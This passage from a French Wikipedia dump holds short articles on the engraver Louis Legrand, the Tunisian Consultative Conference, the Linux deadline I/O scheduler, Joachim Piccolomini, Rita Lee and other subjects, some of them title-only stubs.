Employé de banque, Louis Legrand suit les cours du soir à l'École des beaux-arts de Dijon et obtient le prix Devosge en 1883.
En 1884, il s'installe à Paris et s'initie aux techniques de gravure avec Félicien Rops, sa technique préférée étant celle de l'aquatinte. Il reçoit sa première commande d'une série : "Les premières illustrées".
Dès 1887, il collabore au journal "Le Courrier français". Les dessins qu'il y fait paraître ont le plus souvent pour thème la mort et la déchéance. Poursuivi pour obscénité, il purge une courte peine d'emprisonnement et abandonne ensuite la carrière d'illustrateur satirique.
En 1891, il participe au "Gil Blas" pour illustrer le numéro spécial consacré au Moulin Rouge. Il s'intéresse au monde de la danse, en illustrant notamment un "Cours de danse fin de siècle" (Paris, E. Dentu, 1892) dont les planches sont imprimées dans l'atelier d'Auguste Delâtre. Il fréquente assidûment les salles de répétition et les coulisses de l'école de danseuses ouverte par Nini-Patte-en-l'air rue Frochot.
En 1900, il reçoit une médaille de bronze à l'Exposition universelle de Paris.
En 1906, il est décoré de l'ordre de la Légion d'honneur.
Œuvre.
Avant Henri de Toulouse-Lautrec, il a reproduit la vie nocturne parisienne de la Belle Époque.
La Bretagne fut également une de ses sources d'inspiration (il posséda une maison à Trédrez, près de la pointe de Beg-ar-Forn). Le musée départemental breton de Quimper conserve plusieurs de ses gravures d'inspiration bretonne.
L'éditeur et collectionneur d'art Gustave Pellet lui édita et lui acheta tous ses pastels. Il grava pour lui également des sujets érotiques.

</doc>
<doc id="1872603" url="https://fr.wikipedia.org/wiki?curid=1872603" title="Dictatus Papae">
Dictatus Papae



</doc>
<doc id="1872612" url="https://fr.wikipedia.org/wiki?curid=1872612" title="Conférence consultative tunisienne">
Conférence consultative tunisienne

La Conférence consultative tunisienne est un organe consultatif mis en place durant le protectorat français de Tunisie.
Il s'agit d'une institution hybride, embryon de parlement auquel on donne une voix consultative dans l'examen du budget de la Tunisie. Elle est présidée par le résident général de France ou son représentant. Le domaine de ses délibérations est initialement strictement délimité : à l'interdiction d'aborder toute question d'ordre politique ou constitutionnel s'ajoutent la restriction concernant l'organisation financière, les règles de la comptabilité publique et les ressources et emplois du trésor public. Enfin s'imposent de plein droit à la Conférence les dépenses dites « obligatoires » concernant la liste civile du bey et les dotations et services de la famille husseinite d'une part, les services de la dette tunisienne et les dépenses de gestion des services français d'autre part (art. 8 du décret du ).
Si ses attributions restent toujours très limitées, l'évolution du mode de désignation de ses délégués est représentative de la propagation des idées nationalistes. Malgré les restrictions apportées par le gouvernement du protectorat au choix des délégués, elle permet l'émergence d'une génération d'hommes politiques, comme Abdeljelil Zaouche, Tahar Ben Ammar et M'hamed Chenik, qui négocie avec le gouvernement français les conditions d'accès à l'indépendance de la Tunisie.
Historique.
Débuts (1891-1907).
À partir de 1688, la communauté française à Tunis est représentée auprès du consul de France par deux députés de la Nation qui transmettent les doléances de leurs concitoyens, négociants dans une très grande majorité.
Le , après l'instauration du protectorat français, ils sont remplacés par une chambre de commerce dont le champ d'action s'étend à tout le territoire et concerne l'agriculture et l'industrie aussi bien que le négoce. Dans l'esprit du résident général de France Paul Cambon, cette assemblée est chargée de représenter l'ensemble de la colonie française mais ses membres, favorables à l'annexion de la Tunisie à la France, refusent le rôle qui leur est assigné. Ils sont soutenus dans leurs démarches par le député Honoré Pontois, ancien magistrat à Tunis, qui dépose en juin 1890 une proposition de loi . La proposition est rejetée mais l'alerte a été chaude. C'est pourquoi, une lettre du ministre français des Affaires étrangères Alexandre Ribot en date du invite le résident général Justin Massicault à .
Il est alors décidé de créer une Conférence consultative; sa première session s'ouvre en janvier 1891 dans une aile de la résidence générale. Y siègent les bureaux des chambres de commerce et d'agriculture et les vice-présidents français des municipalités des villes érigées en commune. Le , on y ajoute des représentants des Français non commerçants ni agriculteurs (ouvriers, fonctionnaires, professions libérales, etc.). Le nombre de délégués s'élève alors à 37 (seize représentants des intérêts agricoles et commerciaux, deux représentants du syndicat des viticulteurs, quatre délégués du Nord, trois délégués du Sud et douze membres représentant les municipalités). Les délégués du Nord et du Sud sont élus au suffrage indirect. On élit des délégués (douze au Nord et sept au Sud) qui choisissent ceux d'entre eux qui siégeront à la Conférence. Ce mode de désignation permet au résident général de n'avoir que des notables pour interlocuteurs dont une bonne partie (vice-présidents des municipalités) est nommée par lui. Mais ceux-ci ne l'entendent pas ainsi et la plupart des sessions de la conférence sont l'occasion pour certains de répéter inlassablement deux revendications relayées par la presse : l'élection d'une assemblée au suffrage universel et la possibilité d'examiner voire de contrôler le budget. Ils finissent par être entendus.
Le , il est décidé de réorganiser le mode de désignation des délégués qui sont désignés jusqu'alors ou choisis par les chambres de commerce. La Conférence est désormais élue au suffrage universel direct par les électeurs français scindés en huit circonscriptions électorales (Nord-Ouest, Bizerte, Tunis, Nord-Est, Centre-Est, Centre-Ouest, Sfax et Sud) et trois collèges : agricole, commercial qui accueille aussi les industriels et un troisième pour les personnes ne s'adonnant ni à l'agriculture ni au commerce. Chaque collège nomme quinze délégués pour un total de 45 élus à la Conférence consultative. La durée du mandat est de quatre ans.
Tous les hommes français, âgés d'au moins 21 ans, jouissent du droit de vote sous réserve d'être exempts de certaines condamnations et d'avoir deux ans de domicile en Tunisie. En 1914, par exemple, il y a pour une population de .
Cette répartition des délégués en trois collèges permet aux agriculteurs d'être surreprésentés alors que leur proportion dans la population française ne cesse de décroître. En 1920, par exemple, ils disposent du tiers des délégués alors qu'ils ne représentent plus que 15,3 % de l'électorat.
À partir de 1898, les sessions se tiennent dans un bâtiment acheté par la résidence générale et situé à Tunis, au numéro 20 de l'avenue de Paris, et qui deviendra le . Composé à l'origine d'un rez-de-chaussée et d'un étage, il est surélevé en 1907 lors de la création de la section tunisienne. Finalement, lorsque la décision est prise en 1910 de faire siéger les deux sections séparément, le deuxième étage sera utilisé par la section française pendant que la section tunisienne siègera un étage plus bas.
Création de la section tunisienne (1907).
En 1906, les premières revendications tunisiennes se font entendre. Le 24 mars, Béchir Sfar réclame au résident général des réformes en faveur des « indigènes ». Devant la colère des représentants des grands propriétaires, connus sous le nom de « prépondérants », il est muté à Sousse mais son appel a été entendu.
Le décret beylical du donne satisfaction à une vieille revendication des délégués français : l'examen du budget de l'État. Mais il crée également une section tunisienne, consacrant l'une des revendications des Jeunes Tunisiens. Ses seize membres (quinze musulmans et un israélite) sont nommés à vie par le gouvernement qui les choisit parmi les notables conseillés par les contrôleurs civils, à raison de quatre pour Tunis dont celui de religion juive, et de deux pour Sousse. Les autres sont pris dans les principales villes ou régions sans cependant que toutes les tribus ou caïdats en soient dotés. Les Fraichiches, les Majeur, les Jlass, les Ouled Ayar, les Ouled Aoun, mais aussi Téboursouk et Djerba n'ont ainsi aucun délégué. Zaouche et ses amis qui réclamaient des élections pour désigner les délégués tunisiens protestent mais en vain. Certains des notables choisis ne parlent même pas le français, ce qui les handicape totalement pendant les débats. Zaouche dira d'eux en 1910 que .
Pendant trois ans, les sections indigène (seize délégués) et française (45 délégués) siégent ensemble mais c'est un échec. Les intérêts sont souvent contradictoires et rares sont les délégués bilingues. Il faut donc avoir recours à des interprètes, ce qui entraîne des problèmes de traduction. De plus, la plupart des délégués français n'ont pas digéré la création de cette section indigène qu'ils ont combattue de toutes leurs forces. Alors, ils s'opposent à toutes les mesures favorables aux autochtones, dont le dégrèvement de la mejba. Au fil des réunions, les rapports s'enveniment de plus en plus. Paul Lambert, délégué français resté en dehors du courant arabophone, déclare : . À l'une des séances, les propos sont tellement violents que deux des trois délégués musulmans parlant le français quittent la salle « pour ne pas en entendre davantage ».
C'est pourquoi, le , il est décidé que les deux sections siègent séparément. Il est institué un Conseil supérieur composé des ministres ou chefs de service et de six membres de la Conférence choisis par leurs pairs (trois Français et trois indigènes). À ce conseil de départager les deux sections en cas de divergences entre elles. Cette mesure réussit à calmer les esprits, surtout entre les deux fortes personnalités de l'assemblée : Abdeljelil Zaouche et Victor de Carnières, journaliste et porte-parole des colons français.
En 1911, le mandat des membres français est porté de quatre à six ans, ce qui favorise la constitution d'une véritable classe politique.
En 1912, un vœu signé par certains membres tunisiens de la Conférence (Zaouche, Élie Fitoussi, Mohamed Ben Mabrouk et Brahim Ben Zouari) demande que la Tunisie, arrivée à un certain degré de civilisation, soit en mesure d'élire ses représentants. Cette demande resurgit en 1920.
Crise de 1920.
L'évolution de la population française et les revendications nationalistes tunisiennes de plus en plus vigoureuses provoquent une crise de la Conférence consultative en 1920.
Les délégués français protestent contre le mode de scrutin qui accorde aux agriculteurs le tiers des délégués alors que leur proportion dans la population française est en constante diminution. Quatre d'entre eux démissionnent en novembre et, lors de la dernière session en décembre, vingt membres de la section française sur 45 quittent la séance car « ils considèrent que les pouvoirs actuels de l'assemblée sont inexistants ».
Quant à la section indigène, elle est travaillée par la contestation anti-coloniale qui se développe autour des Jeunes Tunisiens. Lors de la dernière session, sept de ses membres sur seize (délégués de Tunis, Sousse, Bizerte et Le Kef) déposent ce vœu :
Considérant que depuis 1907, ils tiennent leur mandat de l'administration,
Considérant que de toutes les classes de la société tunisienne s'élèvent des protestations contre ce mode de désignation qui n'est plus en harmonie avec les aspirations de la population indigène,
Que cette dernière est unanime à demander aux pouvoirs publics une représentation élue et suffisante au sein des assemblées locales,
Considérant que devant ces manifestations populaires une sorte de discrédit s'attache aux noms et personnes des délégués indigènes qui souffrent dans leur dignité et dans leur considération et rend leur position délicate,
Considérant qu'en présence de cet état d'esprit les soussignés croient de leur devoir de rappeler respectueusement au gouvernement que le moment est venu de donner satisfaction à la population tunisienne et de lui marquer sa confiance en lui conférant par l'exercice des principes de l'élection le droit de choisir librement et directement ses mandataires,
Que ces derniers, issus du même mode de désignation que leurs collègues français, pourront alors poursuivre avec autorité et dignité une collaboration féconde avec l'administration du protectorat et travailler avec elle à assurer à la population un régime de légalité et de garantie que la France, toujours inspirée par ses nobles traditions, ne saurait refuser aux populations dont elle a la tutelle,
Émettent le vœu :
Que prenne fin le mandat à eux attribué par l'administration et que leurs successeurs soient désignés par le principe de l'élection.
Grand Conseil (1922-1951).
Nouvelle institution.
Afin de mettre un terme à cette crise, la Conférence consultative est remplacée par le Grand Conseil le . Celui-ci est composé :
En principe, les deux sections délibèrent séparément : la section française présidée par le résident général et la section indigène présidée par le délégué à la résidence. Une commission arbitrale du Grand Conseil est aussi créée pour arbitrer les différends entre les sections française et indigène. Elle se compose de sept membres de la section française, de sept membres de la section indigène et de sept ou huit hauts fonctionnaires délibérant en commun sous la présidence du résident général.
Pour la section française, les élections se font au suffrage universel et au scrutin de liste avec la faculté de panacher en prenant des noms sur différentes listes. Les élections des délégués tunisiens musulmans sont moins simples mais présentent une réelle avancée par rapport aux désignations de 1907 : les dix représentants des régions sont élus par les notables mais les délégués des chambres de commerce et d'agriculture sont élus sur des listes validées par l'administration après avoir été purgées de la moitié ou des trois-quarts des candidats. De plus, le vote n'est pas secret : chaque électeur doit s'exprimer oralement devant deux notaires. Les israélites sont les seuls à pouvoir élire leurs représentants au suffrage direct et à bulletins secrets.
Ce mode électoral discriminatoire fait l'unanimité contre lui dans la presse nationaliste et communiste. Seuls les riches propriétaires sont représentés, les ouvriers et les intellectuels étant bannis de l'électorat. L'administration garde la main sur les listes électorales et les Tunisiens ne représentent que 29 % des délégués (contre 26 % auparavant) alors qu'ils sont largement majoritaires dans le pays.
Concernant les attributions du Grand Conseil, l'avancée est significative puisque les délégués ne sont plus seulement autorisés à examiner le budget de la régence mais peuvent également le modifier. La résidence générale est maintenant contrainte d'obtenir l'aval de l'assemblée pour contracter un emprunt et ne peut passer outre un avis identique donné par les deux sections.
Intervenue après la crise d'avril 1922, cette réforme vise à apporter une réponse minimale aux revendications du Destour mais le mode de désignation des délégués permet de s'assurer de leur loyalisme à l'égard du protectorat. Les destouriens apportent toutefois leur soutien aux candidatures d'Abdelaziz El Sghair El Béji du Kef et de Sadok Ben Brahim. Mais ce dernier n'est pas élu, les électeurs lui préférant M'hamed Chenik.
Réformes successives.
Il faut attendre six ans pour que ces critiques soient entendues. En 1928, la perte d'influence du Destour rassure le gouvernement du protectorat qui autorise les diplômés à se porter candidats au suffrage indirect. Le nombre de délégués tunisiens passe à 26 mais reste toujours largement minoritaire (33 %). Quant à la section française, elle passe de 44 à 52 membres. L'administration veut satisfaire ceux qui se plaignent de l'importance du nombre des délégués issus des chambres économiques. On augmente donc le nombre d'élus au suffrage universel.
Une nouvelle réforme a lieu le . Le nombre d'élus tunisiens au suffrage direct passe de dix à 19. La section tunisienne passe dans le même temps à 41 membres (42 %) dont quatre israélites contre 56 pour la section française.
Le , les sessions du Grand Conseil sont suspendues. Ses attributions sont alors exercées par le résident général assisté par un comité consultatif de cinq membres français et cinq membres tunisiens (Chenik, Ben Ammar, Albert Bessis, Ahmed Acacha et Abderrahmane El Louze).
Le , le Grand Conseil est rétabli puis complètement remanié le . Les deux sections sont maintenant en nombre égal à 53 délégués chacune. Mais les élections se font toujours au suffrage indirect pour les Tunisiens musulmans : les élus dans les circonscriptions électorales se réunissent pour désigner ceux qui siègeront au Grand Conseil. Par ailleurs, le suffrage n'est toujours pas universel car seuls les Tunisiens payant des impôts, ayant un diplôme ou ayant fait leur service militaire peuvent voter. Le vote est également interdit à tous ceux ayant été condamnés ou internés, ce qui représente beaucoup de monde après les manifestations des années 1930. Enfin, le vote secret n'est toujours pas exigé.
Malgré toutes ces restrictions, ces élections marquent un énorme progrès par rapport au passé. Mais ces évolutions arrivent bien tard dans un pays où les idées nationalistes se sont largement imposées et où la France est complètement déconsidérée après l'invasion de la métropole en  et l'occupation de la Tunisie entre et . Ce mécontentement est visible à Tunis où 28 % des suffrages sont blancs.
Le mandat des délégués arrivant à échéance le , l'organisation des élections devant renouveler la composition du Grand Conseil est l'occasion d'un bras de fer entre le résident général Louis Périllier, qui tient à respecter les délais, et M'hamed Chenik, grand vizir depuis le , qui refuse des convoquer les électeurs tunisiens tant que ses demandes de réforme instaurant l'autonomie interne de la Tunisie n'ont pas été satisfaites. La fin de non-recevoir transmise par le gouvernement français à ses demandes confirme le blocage du processus électoral. Le , le Grand Conseil se réunit pour la dernière fois. L'aggravation de la situation en Tunisie en entraîne sa suspension jusqu'en 1954.
Assemblée tunisienne (1954).
Le , une dernière tentative du gouvernement du protectorat d'instituer une Assemblée tunisienne a lieu, mais il est toujours prévu d'élire les délégués tunisiens au suffrage indirect et la section française a toujours un pouvoir de blocage. Quant aux attributions de cette assemblée toujours consultative, elle déçoit les Tunisiens qui veulent pouvoir décider de leur avenir et n'acceptent plus la mainmise d'une population française qui ne représente que le dixième de la population du pays. L'insécurité empêche la tenue des élections.
De l'examen du budget aux revendications nationales.
Nazli Hafsia, juriste, écrit à propos de la Conférence consultative que par « ce canal, si limité et hybride soit-il, les Tunisiens intervenaient directement et au plus haut niveau à la gestion et [ainsi] à l'évolution du pays dans son ensemble : le décret du stipule en effet dans ses considérants : Désireux de nous entourer, pour l'établissement du budget général de l'État, des avis des représentants élus de la colonie française et des délégués choisis parmi les notables de nos sujets... Or, le budget de l'État est le plan annuel, prévisionnel, du pays. Les recettes du budget sont autant de charges du contribuable tunisien et ses dépenses définissent les services publics et l'évolution des différents secteurs socio-économiques du pays. Être admis à discuter du budget, même à titre consultatif, est donc une participation essentielle à la gestion et à l'évolution de la chose publique, tant en amont quant aux prévisions qu'en aval quant au contrôle de l'exécutif. Le budget de l'État figure donc la volonté réelle, précise, de l'État. Il est à cet égard, déterminant pour la vie nationale ».
Représentativité tunisienne.
Nationalisme et Conférence consultative.
Le mode de désignation des délégués tunisiens semble être une garantie pour le gouvernement de pouvoir choisir des personnalités accommodantes. C'est pourquoi la Conférence a très vite la réputation de réunir des béni-oui-oui. Pourtant, beaucoup de cadres du combat nationaliste sont sortis de cette arène.
Le premier cas emblématique est celui d'El Hadj Saïd Ben Abdelattif. Délégué dans la section indigène, il trouve la mort en 1915 dans le Sud tunisien en combattant face à l'armée française.
En , sept délégués sur seize démissionnent en réclamant des élections. L'un d'eux, Abderrahmane Lazzem, va au bout de ses convictions en faisant partie de la seconde délégation du Destour qui se rend à Paris, emmenée par Tahar Ben Ammar, pour présenter les revendications tunisiennes au président du Conseil Georges Leygues.
La réforme du Grand Conseil, avec les premières élections, voit apparaître des personnalités indissociables de la lutte pour l'indépendance :
Cette évolution est particulièrement marquée lors des élections de 1945. L'administration recense alors onze représentants de tendance nationaliste susceptibles de se rallier souvent aux vues du gouvernement et cinq autres de tendances franchement nationalistes susceptibles de constituer une opposition systématique. Les opposants les plus en vue sont Chadly Rhaïem de Béja, Mahmoud Yassine de Souk El Arba et Yahia Hamrouni de Gabès. L'accession d'éléments dont la loyauté n'est pas assurée montre que les autorités du protectorat semblent respecter les résultats du scrutin. Elles n'interviennent pas non plus pour changer les résultats du scrutin pendant les élections consulaires postérieures.
Abdeljelil Zaouche à la Conférence consultative.
Désaccord au sein des Jeunes Tunisiens (1906).
La première tâche des Jeunes Tunisiens est d'énoncer un programme qui est construit ensemble puis énoncé par chacun : 
La désignation de Zaouche à la Conférence consultative et sa participation marque la première scission au sein du mouvement des Jeunes Tunisiens entre Zaouche et Bach Hamba (par ailleurs beaux-frères). Non seulement le choix du bey agace ce dernier mais cette charge doit, selon Bach Hamba, faire l'objet d'élections. Zaouche écrit lui-même dans son rapport de  : Il est possible que, malgré notre désir de bien faire, nous n'ayons pas toujours eu la notion exacte des besoins ou des aspirations de la population que nous représentions. Notre excuse, s'il en était ainsi, serait dans le fait même que nous n'étions pas à proprement parler des mandataires... Le gouvernement du protectorat pourrait traiter les affaires du pays avec les représentants [élus] de la population indigène, tout au moins de la partie éclairée, dont les avis auraient certes plus de poids que ceux de seize homme pleins de bonne volonté sans doute mais en somme ne représentant qu'eux-mêmes... La Tunisie est arrivée à un degré de civilisation suffisant pour permettre à beaucoup de ses enfants de désigner ceux qu'ils jugent les mieux qualifiés pour défendre les intérêts de la collectivité. Depuis longtemps d'ailleurs, et même dans les villages les plus reculés, les cheikhs sont élus par les notables. À Tunis, les conseillers municipaux l'étaient jadis. Nous concevons parfaitement qu'on ne saurait, du jour au lendemain, établir en Tunisie le suffrage universel, la masse certes n'y est pas préparée. Mais on pourrait instituer une sorte de cens qui comprendrait tous les indigènes majeurs sachant lire et écrire soit en arabe soit en français. Le rôle des membres indigènes de la Conférence consultative serait sinon plus enviable, du moins plus aisé à remplir, si au lieu de tenir les pouvoirs de l'administration, ils les tenaient de leurs pairs. Leurs votes auraient un sens qu'ils ne sauraient avoir aujourd'hui. La colonie française s'oppose régulièrement à ces revendications.
Zaouche ou l'État service public.
Pour Abdeljelil Zaouche, la participation à la Conférence consultative est une occasion de faire entendre la voix tunisienne. Il s'infiltre donc dans cette brèche qui s'ouvre aux Tunisiens. Dans la biographie qu'elle lui consacre, Nazli Hafsia écrit : Car il apparaît à l'expérience que la perfection engendre l'immobilisme dans les actions humaines. Ce n'est semble-t-il que dans l'imperfection et les contraintes que les esprits sont stimulés. Ils donneront au cadre offert, quelles que soient son étroitesse, la fausseté de son caractère politique, son imperfection congénitale, un sens et un pouvoir que les textes, l'ayant créé et organisé, ne prévoyaient guère [...] À cet égard, ce pseudo parlement qu'est la Conférence consultative va évoluer en pratique en tendant d'une part à affirmer de plus en plus fort la présence de la voix tunisienne qui d'avis consultatif s'imposera à la tutelle française. D'autre part, on assiste, à la lecture des procès-verbaux des diverses séances, au débordement des champs abordés et discutés : c'est que le budget, par sa nature même, implique tous les aspects et problèmes de la politique générale même dans le cadre traditionnel d'un budget de gestion et, au terme de l'année, comptes sont demandés aux gouvernants. Parmi les questions abordées à la Conférence consultative par Zaouche figurent celles de :
On assiste donc avec les Jeunes Tunisiens à la naissance de l'« État service public » conçu non seulement comme gestionnaire des prestations publiques classiques mais surtout comme promoteur d'une société moderne, active et avant tout instruite : « La section tunisienne ne peut accepter une diminution dans les crédits de l'enseignement pour les travaux de routes » (propos tenus par Zaouche en 1913). Ce programme d'action porte sur trois secteurs vitaux : l'enseignement, la justice et la fiscalité. Il assure que .
Premières passes d'armes à la Conférence.
Résumant la réponse de Zaouche à l'allocution de bienvenue du résident général Gabriel Alapetite, Marie Dauphin rapporte avec quelle « défiance » les Arabes se présentent à cette séance : Mais le secrétaire indigène Abdeljelil Zaouche y répond très froidement dans une allocution où il s'empresse de tracer le programme des revendications de ses coreligionnaires : enseignement franco-arabe, justice modernisée, réformes fiscales. Il aborde donc immédiatement au cours de cette première séance, la question de l'enseignement, celle de l'admission des Tunisiens aux chambres de commerce l'année suivante. Leurs collègues français, qui avaient protesté contre l'adjonction de ceux-ci à leurs réunions, entamèrent le débat avec le ferme propos de se refuser à toutes réformes proposées dans l'intérêt des musulmans. Le veto est entériné. La question revint donc devant la conférence, poursuit Marie Dauphin, mais elle se pose maintenant sous un autre aspect : Puisqu'il faut en accorder un, quelle sorte d'enseignement donner aux indigènes ? M. Zaouche déposa une motion en faveur de l'enseignement franco-arabe qui fut repoussée. Les écoles seront donc spéciales aux musulmans mais, de plus, l'instruction se servira aussi de méthodes particulières car, en 1908, l'assemblée se prononça pour eux en faveur d'un enseignement professionnel, surtout agricole, et complété par l'institution de jardins scolaires dans les écoles rurales.
Abdeljellil Zaouche quitte la Conférence consultative en 1917 à l'occasion de sa nomination au poste de caïd de Sousse où il prend la succession de Béchir Sfar qui vient de décéder. Il est en effet interdit de cumuler ce poste avec la fonction de délégué.

</doc>
<doc id="1872615" url="https://fr.wikipedia.org/wiki?curid=1872615" title="Deadline scheduler">
Deadline scheduler

Le (« ordonnanceur sur échéance » en français) est un ordonnanceur d'E/S pour le noyau Linux écrit par .
Vue d'ensemble.
Le but du "" est de tenter de garantir un temps de réponse à une requête. Cela est réalisé en imposant une échéance à chaque opération d'E/S afin d'éviter une pénurie de ressources. Il gère deux files FIFO d'échéances en plus des files de requêtes (une de lecture, une d'écriture). Les files d'échéances sont triées par date d'expiration des échéances, tandis que les files de requêtes sont triées par numéro de secteur sur le disque de stockage.
Avant de traiter une requête, l'ordonnanceur décide quelle file utiliser. Les files de lecture ont une plus forte priorité, car les processus sont le plus souvent en attente sur des opérations de lecture. Ensuite,
l'ordonnanceur vérifie si la première requête dans la file d'échéances a expiré, et la traite le cas échéant. Sinon, l'ordonnanceur traite un groupe de requêtes de la liste choisie. Dans les deux cas, l'ordonnanceur traite également un groupe de requêtes suivant celle choisie dans la liste. Ceci permet d'assurer au mieux les temps de réponse aux requêtes, tout en groupant ces dernières suivant les secteurs des disques à atteindre.
Par défaut, les requêtes de lecture ont une échéance de , et les requêtes d'écritures ont .
La documentation du noyau conseille l'utilisation de cet ordonnanceur pour les systèmes de base de données, spécialement dans les cas de systèmes à disques de hautes performances ou d'utilisation de disques supportant la technologie TCQ.
Réglage.
Chaque file d'E/S possède un ensemble de réglages d'ordonnancement qui lui est associée. Ces réglages contrôlent le comportement de l'ordonnanceur d'E/S. Ces réglages sont accessibles dans : codice_1 en supposant que sysfs est monté sur codice_2.

</doc>
<doc id="1872616" url="https://fr.wikipedia.org/wiki?curid=1872616" title="Sultans du Brunéi">
Sultans du Brunéi



</doc>
<doc id="1872618" url="https://fr.wikipedia.org/wiki?curid=1872618" title="Parrot">
Parrot



</doc>
<doc id="1872622" url="https://fr.wikipedia.org/wiki?curid=1872622" title="Joachim Piccolomini">
Joachim Piccolomini

Joachim Piccolomini (Sienne, 1258 - Sienne, 1305) est un servite de Marie reconnu bienheureux par l'Église catholique.
Biographie.
Joachim Piccolomini est né dans une noble famille de Sienne. C'était un enfant très pieux, ayant une grande dévotion pour la Vierge Marie ; son plus grand plaisir était de réciter l'Ave Maria devant une image de Notre-Dame des Douleurs. Dès son plus jeune âge, il avait déjà un grand souci des pauvres auxquels il offrait ses vêtements, et le peu d'argent qu'il avait.
Un jour que son père lui en faisait le reproche, lui disant qu'en agissant ainsi, il allait ruiner la famille, l'enfant lui répondit : « "Vous m'avez enseigné que toute aumône faite à un pauvre est une offrande faite à Jésus. Pouvons-nous lui refuser quelque chose ? Et quel serait l'avantage d'être riche si ce n'était pour se créer un trésor au Paradis ?" ». Son père en pleura de joie.
Joachim rejoignit les Servites de Marie à l'âge de 14 ans, en tant que frère lai, devenant un élève de Philippe Benizi. Il fut un parfait modèle de vertu et de piété, priant jusqu'à une heure avancée de la nuit alors que tous les autres dormaient, jeûnant en honneur des Sept douleurs de la Vierge. Il était humble de cœur : ses frères le poussaient à poursuivre des études en vue de la prêtrise, mais il ne voulait rien d'autre qu'être un serviteur. Toute sa vie il chercha à se cacher du regard des autres, à vivre dans l'obscurité et la modestie. 
Il était toutefois respecté et connu pour sa sainteté. C'est ainsi qu'ayant été transféré à Arezzo, il y eut tant de plaintes à Sienne à l'idée de le voir partir, qu'on lui ordonna immédiatement de revenir.
Mort et miracles.
La légende raconte que la Vierge Marie lui est apparue depuis son enfance, que c'est elle qui a souhaité lui voir intégrer les Servites.
Elle serait apparue aussi un jour avec deux couronnes dans les mains, une de rubis pour le remercier de sa compassion, l'autre de perles pour le récompenser de sa virginité, qu'il lui avait vouée.
Peu de temps avant sa mort, la Vierge lui apparut une dernière fois. Joachim lui demanda si elle accepterait de le faire mourir à la date où Jésus était mort lui-même. La Vierge lui répondit : « "C'est bien, prépare-toi, demain, Vendredi Saint, j'accèderai à tes désirs. Demain, tu seras avec moi au Paradis" ».
Et c'est ainsi que pendant l'Office de la Passion, au moment de la lecture du verset de saint Jean (19-30) "et, baissant la tête, il rendit l'esprit", Joachim mourut. Aussitôt, l'église fut remplie d'une extraordinaire lumière et d'un parfum suave.
Culte.
Joachim Piccolomini a été béatifié le par le Pape Paul V.
Son corps repose dans la basilique San Clemente in Santa Maria dei Servi à Sienne, face à la châsse du bienheureux François Patrizi.

</doc>
<doc id="1872634" url="https://fr.wikipedia.org/wiki?curid=1872634" title="Rita Lee">
Rita Lee

Rita Lee Jones, ou plus simplement Rita Lee, née à São Paulo le et morte dans la même ville le , est une chanteuse, compositrice et musicienne brésilienne.
Biographie.
Née Rita Lee Jones, elle est la fille de Charles Fenley Jones (immigré des États-Unis) et de Romilda Padula (fille d'immigré italien). Elle a deux sœurs, Mary Lee et Virginia Lee. Rita a suivi les cours du lycée Pasteur, établissement français de São Paulo. Elle parle couramment portugais, anglais, français, espagnol et italien. Elle suit ensuite des cours de communication à l'université de São Paulo en 1967, dans la même classe que l'actrice Regina Duarte, mais abandonne rapidement l'université.
Pendant son enfance, elle suit des cours de piano avec la musicienne classique Magdalena Tagliaferro. À l'adolescence, elle commence à se produire au collège dans un groupe appelé Tulio's trio. En 1963, elle forme un ensemble avec deux amies, les Teenage Singers, qui participe à divers spectacles scolaires. L'année suivante, elles se regroupent avec un trio masculin, les Wooden Faces, pour former un nouveau groupe, les Six Sided Rockers, qui s'appellera plus tard O Seis. Ils enregistrent un disque comportant deux chansons qui ne sera cependant jamais commercialisé. Avec le départ de trois membres du groupe, ne restent que Rita, Arnaldo et Sérgio qui changent de nom pour prendre celui de O Konjunto. Sur une suggestion de Ronnie Von, ils changent encore de nom pour Os Mutantes.
Elle se lance dans une carrière solo en 1972. De 1973 à 1978, elle forme le groupe Tutti Frutti qui impose sa douce folie et son éternelle irrévérence sur la scène brésilienne. Sa voix sensuelle et pleine de malice s’adapte tant aux mélodies aux parfums décadents ("Menino Bonito" - 'Joli petit enfant") qu’aux rocks les plus redoutables ("Agora so falta vocé" - "Maintenant il ne manque plus que toi").
Avec Tutti Fruti, Rita Lee sort quatre albums saignants dont le splendide "Fruto proibido" ("Fruit du péché") en 1975, considéré encore comme l’album clef du rock brésilien.
Parfois elle travaille avec Paulo Coelho qui joua un rôle important en tant que parolier durant les années de dictature. Avec lui, Rita signe entre autres le tube "Esse tal de roque enrow".
En 1976, alors enceinte, elle est arrêtée pour détention de marijuana et assignée à résidence pendant un an. C’est durant cette période qu’elle compose avec Paulo Coelho "Arrombou a festa", titre qui cartonne à son tour.
En 1976, elle rencontre son compagnon, le compositeur guitariste Roberto de Carvalho, avec qui elle négocie un nouveau tournant dans sa carrière, plus pop, qui la propulse au rang de super star.
En 1978, sort le dernier album avec Tutti Frutti "Babilonia", l'aventure se finit dans des tensions très fortes entre certains membres.
Avec son mari Roberto de Carvalho, ils sortent en trois ans quatre albums qui font date : "Mania de vocé" (1979), "Lança Perfume" (1980), "Saude" (1981), et "Flagra" (1982).
En France, elle se fait connaître du grand public grâce à son titre "Lança Perfume" (1980) qui est repris par le Trio Esperança en 1995. De 1986 à 1992, elle écrit également des livres pour enfants (les aventures du Alex). Elle tourne également dans les feuilletons brésiliens "Top Model" et "Vamp". En décembre 2007, elle entame une tournée pour fêter ses quarante ans de carrière.
Elle décède le 8 mai 2023.

</doc>
<doc id="1872635" url="https://fr.wikipedia.org/wiki?curid=1872635" title="Rita Lee Jones Carvalho">
Rita Lee Jones Carvalho



</doc>
<doc id="1872639" url="https://fr.wikipedia.org/wiki?curid=1872639" title="François Gourmet">
François Gourmet

François Gourmet, né le à Libramont, est un athlète belge pratiquant le décathlon, en tant que professionnel depuis fin 2005. Il est aussi ingénieur industriel. Il est devenu coach du @waco_sprint en 2016.

</doc>
<doc id="1872641" url="https://fr.wikipedia.org/wiki?curid=1872641" title="Judaïsme religieux-national">
Judaïsme religieux-national

Le judaïsme religieux-national (hébreu : דתי-לאומי, "dati leoumi") est un courant du judaïsme combinant une pratique assez similaire à celle du judaïsme orthodoxe moderne à une idéologie sioniste réinterprétée à travers l'héritage juif traditionnel (Torah, Talmud, etc.) Il est fortement prévalent en Israël, comportant également des adhérents aux États-Unis. 
On les reconnaît en Israël à leurs kippot crochetées ("kippot srougot"), par lesquelles ils sont généralement surnommés. Les ashkénazes de ce courant prient souvent avec un livre de Rite sfard et ont abandonné la prononciation ashkénaze traditionnelle de l'hébreu. Ils apprécient également chanter la "Kabalat Shabbat" de l'office du vendredi soir sur les mélodies de Carlebach.
